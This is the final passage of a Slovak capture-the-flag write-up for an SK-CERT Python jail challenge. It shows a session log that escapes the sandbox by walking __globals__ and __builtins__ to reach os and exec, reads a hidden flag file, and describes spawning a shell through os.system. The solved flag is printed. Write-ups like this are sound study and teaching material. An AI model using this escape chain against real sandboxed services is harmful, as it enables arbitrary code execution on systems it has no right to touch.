b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell/touch#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__#> '
b'file contents: '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell/touch#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/os#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/os/listdir#> '
b'file contents: '
b"['lib', 'etc', 'usr', 'lib64', 'root', 'run', 'home', 'bin', 'sbin', 'srv', 'proc', 'tmp', 'boot', 'var', 'dev', 'opt', 'mnt', 'media', 'sys', '.dockerenv', 'app', 'Vioaix409IIZ8NZFWelmQeOFc2853KQp.txt']\nAn error occurred unknown opcode\n/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/os/listdir#> "
Nájdený súbor: Vioaix409IIZ8NZFWelmQeOFc2853KQp.txt
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/os/listdir#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/os#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help#> '
b'/mnt/__class__/__init__/__globals__/__builtins__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/exec#> file contents: '
b'SK-CERT{15_th15_pwn_0r_4_pyj41l?W3ll_1m_n07_5ur3_31th3r}\nNone\nAn error occurred unknown opcode\n/mnt/__class__/__init__/__globals__/__builtins__/exec#> '     
Nájdený flag: SK-CERT{15_th15_pwn_0r_4_pyj41l?W3ll_1m_n07_5ur3_31th3r}
```

Keď som ponorený do úlohy, niekedy sa stane urobím nejaké kroky navyše. Ako aj tu. Pritom stačilo len exec samotný a v ňom zavolať všetko potrebné. Prípadne v `/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/os/system` zadať `touch asdf` a do `file content:` zadať `sh` a to nám spawne shell.



## Vlajka

```
SK-CERT{15_th15_pwn_0r_4_pyj41l?W3ll_1m_n07_5ur3_31th3r}
```
